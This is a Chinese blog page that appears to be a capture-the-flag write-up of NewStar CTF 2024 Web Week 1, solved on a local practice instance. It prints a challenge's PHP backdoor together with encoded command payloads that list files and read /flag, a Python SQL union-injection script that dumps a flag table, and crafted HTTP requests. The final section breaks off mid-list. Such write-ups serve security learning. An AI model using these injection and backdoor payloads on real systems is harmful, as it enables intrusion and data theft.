@@ -1,0 +1,203 @@
+<!DOCTYPE html>
+<html lang="zh">
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="renderer" content="webkit">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
+    <meta name="google-site-verification" content="TZE0rZyIqLl10trYu3BWBWa1Vmz6HFwhb2OcNEK4u-s" />
+     <link rel="shortcut icon" href= /img/huaji.ico >
+    <title>
+        blog
+    </title>
+    <meta name="description" content= 歪比歪比 >
+    <meta name="keywords" content= Blog,Hexo,Huaji >
+    
+<link rel="stylesheet" href="/libs/highlight/styles/monokai-sublime.css">
+
+    
+<link rel="stylesheet" href="/libs/font-awesome/css/font-awesome.min.css">
+
+    
+<link rel="stylesheet" href="/css/style.css">
+
+<meta name="generator" content="Hexo 7.3.0"></head>
+<body id="bodyx">
+    <div class="hd posts">
+    <a href="/index.html"><i class="fa fa-home
+ replay-btn" aria-hidden="true"></i></a>
+    <div class="post-title">
+        <p>
+            NewStar CTF 2024 Web Week1复现
+        </p>
+        <hr>
+    </div>
+    <div class="post-content">
+        <h1 id="NewStar-CTF-2024-Web-Week1复现"><a href="#NewStar-CTF-2024-Web-Week1复现" class="headerlink" title="NewStar CTF 2024 Web Week1复现"></a>NewStar CTF 2024 Web Week1复现</h1><p>因为主包假期准备专攻web手，所以现在刷题只刷web了，其他方向到时候要学的话再补</p>
+<p>平台链接<a target="_blank" rel="noopener" href="https://ctf.xidian.edu.cn/training/14">https://ctf.xidian.edu.cn/training/14</a></p>
+<p>记得用websocket reflector x</p>
+<p>我这里全让他连到127.0.0.1:48254了</p>
+<p>写于7.17</p>
+<h3 id="headach3"><a href="#headach3" class="headerlink" title="headach3"></a>headach3</h3><p>登上去返回</p>
+<p>My HEAD(er) aches!!!!!<br>HELP ME DOCTOR!!!</p>
+<p>查看响应头发现fl3g:flag{You_Ar3_R3Ally_A_9ooD_d0ctor}</p>
+<h3 id="会赢吗"><a href="#会赢吗" class="headerlink" title="会赢吗"></a>会赢吗</h3><p>进页面之后自动跳转到<a target="_blank" rel="noopener" href="http://127.0.0.1:48254/3ntranc3">http://127.0.0.1:48254/3ntranc3</a></p>
+<p>ctrl+u查看源代码，发现</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;!-- flag第一部分：ZmxhZ3tXQTB3，开始你的新学期吧！:/4cqu1siti0n --&gt;</span><br></pre></td></tr></table></figure>
+
+<p>访问<a target="_blank" rel="noopener" href="http://127.0.0.1:48254/4cqu1siti0n">http://127.0.0.1:48254/4cqu1siti0n</a></p>
+<p>题目提示js，所以看一眼js</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">async function revealFlag(className) &#123;</span><br><span class="line">    try &#123;</span><br><span class="line">        const response = await fetch(`/api/flag/$&#123;className&#125;`, &#123;</span><br><span class="line">            method: &#x27;POST&#x27;,</span><br><span class="line">            headers: &#123;</span><br><span class="line">                &#x27;Content-Type&#x27;: &#x27;application/json&#x27;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line">        if (response.ok) &#123;</span><br><span class="line">            const data = await response.json();</span><br><span class="line">            console.log(`恭喜你！你获得了第二部分的 flag: $&#123;data.flag&#125;\n……\n时光荏苒，你成长了很多，也发生了一些事情。去看看吧：/$&#123;data.nextLevel&#125;`);</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">            console.error(&#x27;请求失败，请检查输入或服务器响应。&#x27;);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; catch (error) &#123;</span><br><span class="line">        console.error(&#x27;请求过程中出现错误:&#x27;, error);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">// 控制台提示</span><br><span class="line">console.log(&quot;你似乎对这门叫做4cqu1siti0n的课很好奇？那就来看看控制台吧！&quot;);</span><br><span class="line">    </span><br></pre></td></tr></table></figure>
+
+<p>所以控制台输入revealFlag(“4cqu1siti0n”); </p>
+<p>返回</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Promise &#123; &lt;state&gt;: &quot;pending&quot; &#125; </span><br><span class="line">恭喜你！你获得了第二部分的 flag: IV95NF9yM2Fs …… 时光荏苒，你成长了很多，也发生了一些事情。去看看吧：/s34l</span><br></pre></td></tr></table></figure>
+
+<p>第三段也是js</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable language_">document</span>.<span class="title function_">addEventListener</span>(<span class="string">&#x27;DOMContentLoaded&#x27;</span>, <span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">    <span class="keyword">const</span> form = <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&#x27;seal_him&#x27;</span>);</span><br><span class="line">    <span class="keyword">const</span> stateElement = <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&#x27;state&#x27;</span>);</span><br><span class="line">    <span class="keyword">const</span> messageElement = <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&#x27;message&#x27;</span>);</span><br><span class="line"></span><br><span class="line">    form.<span class="title function_">addEventListener</span>(<span class="string">&#x27;submit&#x27;</span>, <span class="keyword">async</span> <span class="keyword">function</span> (<span class="params">event</span>) &#123;</span><br><span class="line">        event.<span class="title function_">preventDefault</span>();</span><br><span class="line"></span><br><span class="line">  </span><br><span class="line">        <span class="keyword">if</span> (stateElement.<span class="property">textContent</span>.<span class="title function_">trim</span>() !== <span class="string">&#x27;解封&#x27;</span>) &#123;</span><br><span class="line">            messageElement.<span class="property">textContent</span> = <span class="string">&#x27;如何是好？&#x27;</span>;</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="keyword">const</span> response = <span class="keyword">await</span> <span class="title function_">fetch</span>(<span class="string">&#x27;/api/flag/s34l&#x27;</span>, &#123;</span><br><span class="line">                <span class="attr">method</span>: <span class="string">&#x27;POST&#x27;</span>,</span><br><span class="line">                <span class="attr">headers</span>: &#123;</span><br><span class="line">                    <span class="string">&#x27;Content-Type&#x27;</span>: <span class="string">&#x27;application/json&#x27;</span></span><br><span class="line">                &#125;,</span><br><span class="line">                <span class="attr">body</span>: <span class="title class_">JSON</span>.<span class="title function_">stringify</span>(&#123; <span class="attr">csrf_token</span>: <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&#x27;csrf_token&#x27;</span>).<span class="property">value</span> &#125;)</span><br><span class="line">            &#125;);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (response.<span class="property">ok</span>) &#123;</span><br><span class="line">                <span class="keyword">const</span> data = <span class="keyword">await</span> response.<span class="title function_">json</span>();</span><br><span class="line">                messageElement.<span class="property">textContent</span> = <span class="string">`第三部分Flag: <span class="subst">$&#123;data.flag&#125;</span>, 你解救了五条悟！下一关: /<span class="subst">$&#123;data.nextLevel || <span class="string">&#x27;无&#x27;</span>&#125;</span>`</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                messageElement.<span class="property">textContent</span> = <span class="string">&#x27;请求失败，请重试。&#x27;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (error) &#123;</span><br><span class="line">            messageElement.<span class="property">textContent</span> = <span class="string">&#x27;请求过程中出现错误，请重试。&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;);</span><br><span class="line">&#125;);</span><br><span class="line">    </span><br></pre></td></tr></table></figure>
+
+<p><del>所以我们可以先获取一个csrf_token</del></p>
+<p><del>使用document.getElementById(‘csrf_token’).value</del></p>
+<p>把id是state的内容改成”解封”即可，</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">第三部分Flag: MXlfR3I0c1B, 你解救了五条悟！下一关: /Ap3x</span><br></pre></td></tr></table></figure>
+
+<p>第四部分</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;overlay&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;content&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">h1</span>&gt;</span>会赢吗？<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">h2</span>&gt;</span>现代最强的归来，五条悟的复活宣言！<span class="tag">&lt;/<span class="name">h2</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">p</span>&gt;</span>绝对的强者，由此而生的孤独，教会你爱的是....<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">form</span> <span class="attr">id</span>=<span class="string">&quot;winForm&quot;</span> <span class="attr">action</span>=<span class="string">&quot;/api/flag/Ap3x&quot;</span> <span class="attr">method</span>=<span class="string">&quot;post&quot;</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;hidden&quot;</span> <span class="attr">name</span>=<span class="string">&quot;csrf_token&quot;</span> <span class="attr">id</span>=<span class="string">&quot;csrf_token&quot;</span> <span class="attr">value</span>=<span class="string">&quot;hfaousghashgfasbasiouwrda1_&quot;</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">button</span> <span class="attr">type</span>=<span class="string">&quot;submit&quot;</span>&gt;</span>会赢的！<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">noscript</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">form</span> <span class="attr">class</span>=<span class="string">&quot;s&quot;</span> <span class="attr">action</span>=<span class="string">&quot;/api/flag/Ap3x&quot;</span> <span class="attr">method</span>=<span class="string">&quot;post&quot;</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;hidden&quot;</span> <span class="attr">name</span>=<span class="string">&quot;csrf_token&quot;</span> <span class="attr">id</span>=<span class="string">&quot;csrf_token&quot;</span> <span class="attr">value</span>=<span class="string">&quot;hfaousghashgfasbasiouwrda1_&quot;</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">button</span> <span class="attr">type</span>=<span class="string">&quot;submit&quot;</span>&gt;</span>无量空处！！<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">noscript</span>&gt;</span></span><br><span class="line">        </span><br><span class="line">        <span class="tag">&lt;<span class="name">p</span> <span class="attr">id</span>=<span class="string">&quot;message&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">            <span class="variable language_">document</span>.<span class="title function_">querySelector</span>(<span class="string">&#x27;form&#x27;</span>).<span class="title function_">addEventListener</span>(<span class="string">&#x27;submit&#x27;</span>, <span class="keyword">function</span> (<span class="params">event</span>) &#123;</span></span><br><span class="line"><span class="language-javascript">                    event.<span class="title function_">preventDefault</span>();</span></span><br><span class="line"><span class="language-javascript">                    <span class="title function_">alert</span>(<span class="string">&quot;宿傩的领域太强了，有什么办法让他的领域失效呢？&quot;</span>);</span></span><br><span class="line"><span class="language-javascript">                &#125;);</span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">                (<span class="keyword">function</span> (<span class="params"></span>) &#123;</span></span><br><span class="line"><span class="language-javascript">                    <span class="keyword">const</span> originalConsoleLog = <span class="variable language_">console</span>.<span class="property">log</span>;</span></span><br><span class="line"><span class="language-javascript">                    <span class="variable language_">console</span>.<span class="property">log</span> = <span class="keyword">function</span> (<span class="params"></span>) &#123;</span></span><br><span class="line"><span class="language-javascript">                        originalConsoleLog.<span class="title function_">apply</span>(<span class="variable language_">console</span>, <span class="variable language_">arguments</span>);</span></span><br><span class="line"><span class="language-javascript">                        <span class="title function_">alert</span>(<span class="string">&quot;你觉得你能这么简单地获取到线索？&quot;</span>);</span></span><br><span class="line"><span class="language-javascript">                    &#125;;</span></span><br><span class="line"><span class="language-javascript">                &#125;)();</span></span><br><span class="line"><span class="language-javascript">        </span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>注意到有noscript标签，禁用js就又出现一个button</p>
+<p>{“flag”:”fSkpKcyF9”,”nextLevel”:null}</p>
+<p>拼接flag：ZmxhZ3tXQTB3IV95NF9yM2FsMXlfR3I0c1BfSkpKcyF9</p>
+<p>base64解码</p>
+<p>flag{WA0w!_y4_r3al1y_Gr4sP_JJJs!}</p>
+<h3 id="智械危机"><a href="#智械危机" class="headerlink" title="智械危机"></a>智械危机</h3><p>这题可能要用dirsearch所以我用了另一个ip：192.168.139.1:48254，但虚拟机还是连不上，过段时间专门研究一下吧</p>
+<p>根据题目提示robots，所以访问<a target="_blank" rel="noopener" href="http://127.0.0.1:48254/robots.txt">http://127.0.0.1:48254/robots.txt</a></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">User-agent: *</span><br><span class="line">Disallow: /backd0or.php</span><br></pre></td></tr></table></figure>
+
+<p>访问后门，返回</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">execute_cmd</span>(<span class="params"><span class="variable">$cmd</span></span>) </span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">system</span>(<span class="variable">$cmd</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">decrypt_request</span>(<span class="params"><span class="variable">$cmd</span>, <span class="variable">$key</span></span>) </span>&#123;</span><br><span class="line">    <span class="variable">$decoded_key</span> = <span class="title function_ invoke__">base64_decode</span>(<span class="variable">$key</span>);</span><br><span class="line">    <span class="variable">$reversed_cmd</span> = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="variable">$i</span> = <span class="title function_ invoke__">strlen</span>(<span class="variable">$cmd</span>) - <span class="number">1</span>; <span class="variable">$i</span> &gt;= <span class="number">0</span>; <span class="variable">$i</span>--) &#123;</span><br><span class="line">        <span class="variable">$reversed_cmd</span> .= <span class="variable">$cmd</span>[<span class="variable">$i</span>];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$hashed_reversed_cmd</span> = <span class="title function_ invoke__">md5</span>(<span class="variable">$reversed_cmd</span>);</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$hashed_reversed_cmd</span> !== <span class="variable">$decoded_key</span>) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;Invalid key&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$decrypted_cmd</span> = <span class="title function_ invoke__">base64_decode</span>(<span class="variable">$cmd</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$decrypted_cmd</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;cmd&#x27;</span>]) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;key&#x27;</span>])) &#123;</span><br><span class="line">    <span class="title function_ invoke__">execute_cmd</span>(<span class="title function_ invoke__">decrypt_request</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;cmd&#x27;</span>],<span class="variable">$_POST</span>[<span class="string">&#x27;key&#x27;</span>]));</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span>  <span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">execute_cmd</span>(<span class="params"><span class="variable">$cmd</span></span>) </span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">system</span>(<span class="variable">$cmd</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">decrypt_request</span>(<span class="params"><span class="variable">$cmd</span>, <span class="variable">$key</span></span>) </span>&#123;</span><br><span class="line">    <span class="variable">$decoded_key</span> = <span class="title function_ invoke__">base64_decode</span>(<span class="variable">$key</span>);</span><br><span class="line">    <span class="variable">$reversed_cmd</span> = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="variable">$i</span> = <span class="title function_ invoke__">strlen</span>(<span class="variable">$cmd</span>) - <span class="number">1</span>; <span class="variable">$i</span> &gt;= <span class="number">0</span>; <span class="variable">$i</span>--) &#123;</span><br><span class="line">        <span class="variable">$reversed_cmd</span> .= <span class="variable">$cmd</span>[<span class="variable">$i</span>];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$hashed_reversed_cmd</span> = <span class="title function_ invoke__">md5</span>(<span class="variable">$reversed_cmd</span>);</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$hashed_reversed_cmd</span> !== <span class="variable">$decoded_key</span>) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;Invalid key&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$decrypted_cmd</span> = <span class="title function_ invoke__">base64_decode</span>(<span class="variable">$cmd</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$decrypted_cmd</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;cmd&#x27;</span>]) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;key&#x27;</span>])) &#123;</span><br><span class="line">    <span class="title function_ invoke__">execute_cmd</span>(<span class="title function_ invoke__">decrypt_request</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;cmd&#x27;</span>],<span class="variable">$_POST</span>[<span class="string">&#x27;key&#x27;</span>]));</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure>
+
+<p>分析可以看出来cmd需要进行base64编码，key是To Base64-&gt;reverse-&gt;MD5-&gt;To Base64</p>
+<p>ls的payload：cmd&#x3D;bHM&#x3D;&amp;key&#x3D;N2FiZThiMjRiZDAxMzc0NDZmZDMzNmMyMjk4ZmNjYTA&#x3D;</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">backd0or.php index.php robots.txt </span><br></pre></td></tr></table></figure>
+
+<p>ls &#x2F;的payload：cmd&#x3D;bHMgLw&#x3D;&#x3D;&amp;key&#x3D;ZTk0ZDNmOWQyNzBmNTczNGMwZTYwNDY3ZDQ0ZTdkNDY&#x3D;</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bin boot dev etc flag home lib lib64 media mnt my_init my_service opt proc root run sbin srv sys tmp usr var </span><br></pre></td></tr></table></figure>
+
+<p>cat &#x2F;flag的payload：</p>
+<p>cmd&#x3D;Y2F0IC9mbGFn&amp;key&#x3D;ODc5YTU5MWM2Nzg1YTRlMTM5OGI5NmE5YTFiYzY3ZWI&#x3D;</p>
+<h3 id="谢谢皮蛋"><a href="#谢谢皮蛋" class="headerlink" title="谢谢皮蛋"></a>谢谢皮蛋</h3><p>sql注入的题目，刚好这几天在做sql的题，这题的payload又要进行base64编码，所以刚好写个脚本练练手。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line">import base64</span><br><span class="line"></span><br><span class="line">payload1=&quot;-1 union select 1,database()#&quot;</span><br><span class="line">payload2=&quot;-1 union select 1,group_concat(table_name) from information_schema.tables where table_schema=database()#&quot;</span><br><span class="line">payload3=&quot;-1 union select 1,group_concat(column_name) from information_schema.columns where table_schema=database() and table_name=&#x27;Fl4g&#x27;#&quot;</span><br><span class="line">payload4=&quot;-1 union select 1,group_concat(value) from Fl4g#&quot;</span><br><span class="line"></span><br><span class="line">d=&#123;&quot;id&quot;:base64.b64encode(payload4.encode())&#125;</span><br><span class="line">r=requests.post(&quot;http://127.0.0.1:48254/&quot;,data=d)</span><br><span class="line">print(r.text)</span><br></pre></td></tr></table></figure>
+
+
+
+
+<h3 id="PangBai-过家家（1）（未出）"><a href="#PangBai-过家家（1）（未出）" class="headerlink" title="PangBai 过家家（1）（未出）"></a>PangBai 过家家（1）（未出）</h3><p>这似乎是解题数量最少的一个</p>
+<ul>
+<li><p>第一个界面题目hint：PangBai 的头部（Header）里便隐藏着一些秘密，需要你主动去发现。</p>
+<p>所以看请求里有个Location:&#x2F;aaf6f587-2176-4f35-ae1a-f15cb08018da</p>
+<p>故访问<a target="_blank" rel="noopener" href="http://127.0.0.1:48254/aaf6f587-2176-4f35-ae1a-f15cb08018da">http://127.0.0.1:48254/aaf6f587-2176-4f35-ae1a-f15cb08018da</a></p>
+</li>
+<li><p>到第二个界面</p>
+<p>hint：向 PangBai 询问（Query）一下（<code>ask=miao</code>）吧 ~</p>
+<p>所以访问<a target="_blank" rel="noopener" href="http://127.0.0.1:48254/?ask=miao">http://127.0.0.1:48254/?ask=miao</a></p>
+</li>
+<li><p>第三个界面</p>
+<p>hint：用另一种方法（Method）打声招呼（<code>say=hello</code>）吧 ~</p>
+<p>用post加上即可</p>
+</li>
+<li><p>第四个界面</p>
+<p>hint：PangBai 回应了呢！可只有 <code>Papa</code> 的话语才能让她感到安心。 代理人（Agent)，这个委托你就接了吧！</p>
+<p>设置User-Agent:Papa&#x2F;5.0（看了wp说这里的ua需要写标准）</p>
+<p><a target="_blank" rel="noopener" href="https://developer.mozilla.org/en-US/docs/Web/HTTP/Reference/Headers/User-Agent">https://developer.mozilla.org/en-US/docs/Web/HTTP/Reference/Headers/User-Agent</a></p>
+<p>此时提示需要将 <code>say</code> 字段改成”玛卡巴卡阿卡哇卡米卡玛卡呣”</p>
+</li>
+<li><p>第五个界面</p>
+<p>hint：PangBai 依然对你比较警惕，因此「玛卡巴卡阿卡哇卡米卡玛卡呣」或许是不可省略的。</p>
+<p>所以用patch协议发一个包</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">PATCH /?ask=miao HTTP/1.1</span><br><span class="line">Host: 127.0.0.1:48254</span><br><span class="line">User-Agent: Papa/1.0</span><br><span class="line">Content-Type: multipart/form-data; boundary=abc</span><br><span class="line">Cookie: token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJsZXZlbCI6NX0.NRniulOohxCiXwRr0HwZkHnClUvmscw8nG4tj5ibXFI</span><br><span class="line">Content-Length: 178</span><br><span class="line"></span><br><span class="line">--abc</span><br><span class="line">Content-Disposition: form-data; name=&quot;file&quot;; filename=&quot;1.zip&quot;</span><br><span class="line"></span><br><span class="line">123</span><br><span class="line">--abc</span><br><span class="line">Content-Disposition: form-data; name=&quot;say&quot;</span><br><span class="line"></span><br><span class="line">玛卡巴卡阿卡哇卡米卡玛卡呣</span><br><span class="line">--abc--</span><br></pre></td></tr></table></figure>
+
+<p>response：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">HTTP/1.1 302 Found</span><br><span class="line">set-cookie: token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJsZXZlbCI6Nn0.2V4DHSNnWXgwF9MlRAkx6pxvrqZ0LDV0V0GfhdtzWZY; Max-Age=86400; Path=/</span><br><span class="line">Location: /?ask=miao</span><br><span class="line">x-powered-by: Hono</span><br><span class="line">Date: Thu, 17 Jul 2025 14:37:49 GMT</span><br><span class="line">Content-Length: 0</span><br></pre></td></tr></table></figure>
+
+
+</li>
+<li><p>第六部分</p>
